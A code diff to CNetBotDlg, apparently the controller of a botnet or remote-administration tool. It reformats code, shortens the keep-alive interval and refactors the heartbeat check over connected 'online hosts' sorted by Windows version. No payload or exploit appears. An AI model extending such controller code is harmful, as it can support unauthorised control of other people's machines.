@@ -522,7 +522,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 	switch(nID)
 	{
 	case IDC_RADIO1://WinXP
-		for (i=0; i<AllNum; i++)
+		for (i = 0; i < AllNum; i++)
 		{
 			CString ip;
 			ip=m_OnLineList.GetItemText(i,3);
@@ -535,7 +535,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 		}
 		break;
 	case IDC_RADIO2://Win2000&2003
-		for (i=0;i<AllNum;i++)
+		for (i = 0;i < AllNum;i++)
 		{
 			CString ip;
 			ip=m_OnLineList.GetItemText(i,3);
@@ -671,7 +671,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 	if(socket != INVALID_SOCKET)
 	{
 		//设置心跳
-		TurnonKeepAlive(socket, 150);
+		TurnonKeepAlive(socket, 120);
 
 		//recv socket type
 		MsgHead msgHead;
@@ -802,7 +802,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 			break;
 		default://啥都不是，关掉你
 			{
-				shutdown(socket,0x02);
+				shutdown(socket, 0x02);
 				closesocket(socket);
 			}
 			break;
@@ -875,61 +875,29 @@ int CNetBotDlg::checkfun()
 	msgHead.dwCmd = CMD_HEARTBEAT;
 	msgHead.dwSize = 0;
 	
-	DWORD dwCount = 0,dwSel;
+	static DWORD dwCount = 0;
 
-		dwCount++;
-		dwSel = dwCount % 3;
-		if(dwSel == 0)//检测偶数
-		{
-			CAutoLock Lock(cOnlineLock);
-			int AllNum = m_OnLineList.GetItemCount();
-			DWORD socket;
-			for(int i=0; i < AllNum; i+=2)
-			{	
-				socket=m_OnLineList.GetItemData(i);
-				if(!SendMsg(socket,NULL,&msgHead))
-				{
-					m_OnLineList.DeleteItem(i);
-					AllNum--;
-					i--;
-				}	
-			}
-		}
-		else if(dwSel == 1)//检测奇数
-		{
-			CAutoLock Lock(cOnlineLock);
-			int AllNum = m_OnLineList.GetItemCount();
-			DWORD socket;
-			for(int i=1; i < AllNum; i+=2)
-			{	
-				socket=m_OnLineList.GetItemData(i);
-				if(!SendMsg(socket,NULL,&msgHead))
-				{
-					m_OnLineList.DeleteItem(i);
-					AllNum--;
-					i--;
-				}	
-			}
-		}
-		else if(dwSel == 2)//检测所有
-		{
-			CAutoLock Lock(cOnlineLock);
-			int AllNum = m_OnLineList.GetItemCount();
-			DWORD socket;
-			for(int i=0; i < AllNum; i++)
-			{	
-				socket=m_OnLineList.GetItemData(i);
-				if(!SendMsg(socket,NULL,&msgHead))
-				{
-					m_OnLineList.DeleteItem(i);
-					AllNum--;
-					i--;
-				}	
-			}
-		}
-		
-		StatusTextOut(2,"当前在线主机 [%d]",m_OnLineList.GetItemCount());
+	dwCount += 1;
+	dwCount %= 3;
 
+	CAutoLock Lock(cOnlineLock);
+	int AllNum = m_OnLineList.GetItemCount();
+	DWORD socket;
+	for(int i = dwCount; i < AllNum; i += 2)
+	{	
+		socket = m_OnLineList.GetItemData(i);
+		if(!SendMsg(socket, NULL, &msgHead))
+		{
+			shutdown(socket, 0x02);
+			closesocket(socket);
+			m_OnLineList.DeleteItem(i);
+			AllNum--;
+			i--;
+		}	
+	}
+	
+	StatusTextOut(2,"当前在线主机 [%d]",m_OnLineList.GetItemCount());
+	
 	return 0;
 }
 
